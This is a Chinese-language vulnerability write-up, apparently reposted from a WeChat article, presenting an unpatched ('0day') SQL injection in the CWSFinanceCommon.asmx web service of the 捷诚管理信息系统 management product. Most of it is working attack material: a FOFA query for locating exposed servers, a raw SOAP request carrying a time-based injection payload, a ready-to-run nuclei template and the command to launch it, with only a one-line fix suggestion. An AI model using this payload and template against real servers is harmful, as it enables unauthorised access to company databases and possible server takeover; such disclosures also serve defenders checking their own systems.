bugs/【0day】捷诚管理信息系统 CWSFinanceCommon SQL 注入漏洞 (附 nuclei poc).md

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tUSLho32uZGLMJVYUScchw)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

捷诚管理信息系统 CWSFinanceCommon.asmx sql 注入漏洞

02

—  

漏洞影响

捷诚管理信息系统

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPLL9c69bXbFkybJLTY26xm8KiaCQwOYGFTIwchqpEZ4iaUsqHmWCAbT8nm14Cjrud3Gwia5wVOOmEBA/640?wx_fmt=png&from=appmsg)

03

—  

漏洞描述

捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该系统 CWSFinanceCommon.asmx 存在 sql 注入漏洞。黑客可以通过该漏洞获取数据库敏感信息，甚至远控服务器。

04

—  

FOFA 搜索语句

```
body="/Scripts/EnjoyMsg.js"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPLL9c69bXbFkybJLTY26xmLnprpQACzC91K0J2ENZuhletwCwMclzkmpe3997qmpE5yyiccCbNt1A/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

向靶场发送如下数据包

```
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: 192.168.86.128:9001
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
Content-Length: 369
Accept: */*
Accept-Language: en
Content-Type: text/xml; charset=utf-8
Accept-Encoding: gzip
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
      <sId>1';waitfor delay '0:0:5'--+</sId>
    </GetOSpById>
  </soap:Body>
</soap:Envelope>

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPLL9c69bXbFkybJLTY26xmou8LgiaLYiawvEhZmWNfHZ7PavBH16gIWJcVXOfNTqfYYAcw7G98iar8A/640?wx_fmt=png&from=appmsg)

证明存在漏洞

06

—  

nuclei poc

poc 文件内容如下

```
id: jiecheng-CWSFinanceCommon-sqli
info:
  name: 捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞
  author: fgz
  severity: high
  description: '捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该系统CWSFinanceCommon.asmx 存在sql注入漏洞。黑客可以通过该漏洞获取数据库敏感信息，甚至远控服务器。'
  tags: 2023,jiecheng,sqli
  metadata:
    max-request: 3
    fofa-query: body="/Scripts/EnjoyMsg.js"
    verified: true
http:
  - method: POST
    path:
      - "\{\{BaseURL\}\}/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx"
    headers:
      Content-Type: text/xml; charset=utf-8
    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"\
      http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
      \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n\
      \    <GetOSpById xmlns=\"http://tempuri.org/\">\n      <sId>1';waitfor delay\
      \ '0:0:5'--+</sId>\n    </GetOSpById>\n  </soap:Body>\n</soap:Envelope>"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=6"

```

运行 POC

```
nuclei.exe -t mypoc/其他/jiecheng-CWSFinanceCommon-sqli.yaml -u http://192.168.86.128:9001

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPLL9c69bXbFkybJLTY26xmW9cibECib2CDpgy8icjPSrHZ9cA1J9CFj0ZJaSpAHTlmsbG5LCuSUhXEw/640?wx_fmt=png&from=appmsg)

07

—  

修复建议

请关注厂商补丁公告信息及时打补丁，或者部署 waf 产品进行防护。